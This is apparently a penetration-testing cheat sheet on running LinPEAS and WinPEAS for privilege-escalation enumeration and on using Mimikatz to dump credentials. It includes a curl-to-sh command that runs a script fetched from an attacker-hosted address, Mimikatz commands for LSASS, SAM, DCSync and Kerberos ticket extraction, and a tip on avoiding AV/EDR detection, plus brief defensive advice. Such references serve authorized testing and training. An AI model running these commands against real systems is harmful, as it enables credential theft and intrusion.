# LinPEAS, WinPEAS & Mimikatz — Post-Exploitation & PrivEsc Tools

> **TL;DR:** **LinPEAS** and **WinPEAS** automate local privilege escalation enumeration on Linux and Windows targets. **Mimikatz** extracts plaintext passwords, NTLM hashes, and Kerberos tickets from Windows memory (`LSASS`) once you have local Administrator/`SYSTEM` privileges.

---

## 1. LinPEAS & WinPEAS (Privilege Escalation Enumeration)

### Installation / Staging on Kali
```bash
sudo apt install -y peass
# Binaries & scripts are stored in /usr/share/peass/
ls /usr/share/peass/linpeas/linpeas.sh
ls /usr/share/peass/winpeas/winPEASx64.exe
```

### Running LinPEAS (Linux Target)
Host from Kali (`python3 -m http.server 8000`), download to `/tmp` or pipe directly to `sh` in memory:
```bash
# On Target:
curl -L http://10.10.14.5:8000/linpeas.sh | sh | tee /tmp/linpeas.out
```
**Color Legend:**
- **Red/Yellow:** 99% chance of a privilege escalation vector (e.g., writable `/etc/passwd`, `NOPASSWD` sudo, dangerous SUID).
- **Red:** Must-investigate misconfiguration.

### Running WinPEAS (Windows Target)
```cmd
:: Download via certutil or PowerShell, then run:
.\winPEASx64.exe > C:\Windows\Temp\winpeas.txt
```
Look for **Modifiable Services**, **Unquoted Service Paths**, **Token Privileges** (`SeImpersonatePrivilege`), and **AutoLogon** registry credentials.

---

## 2. Mimikatz — Windows Credential Extraction (Lab/Authorized Use)

Kali includes pre-compiled Mimikatz in `/usr/share/windows-resources/mimikatz/`.

### Essential Mimikatz Commands (Run as Local Admin / SYSTEM)
```text
mimikatz # privilege::debug                  // Verify SeDebugPrivilege
mimikatz # sekurlsa::logonpasswords          // Dump NTLM hashes, Kerberos keys, & cached creds from LSASS
mimikatz # lsadump::sam                      // Dump local SAM database hashes (offline/SYSTEM)
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator   // DCSync (requires Replication rights)
mimikatz # sekurlsa::tickets /export         // Export Kerberos .kirbi tickets from memory
```

### Safer Alternative: Dump LSASS Offline -> Parse on Kali with `pypykatz`
Instead of running `mimikatz.exe` on target (heavily flagged by AV/EDR), parse an LSASS dump offline on Kali:
```bash
pypykatz lsa minidump lsass.dmp
```

---

## Common Pitfalls & Defensive Notes
- **AV/EDR Instant Quarantine:** Both `winPEAS.exe` and `mimikatz.exe` are flagged immediately by Windows Defender. In real engagements, rely on manual enumeration commands (`whoami /priv`, `sudo -l`) first.
- **Defensive Tip:** Enable **Credential Guard** and **LSA Protection (`RunAsPPL`)** on Windows to block LSASS memory reading (`Event ID 10` in Sysmon), and never leave Domain Admin sessions logged into Tier-2 workstations.
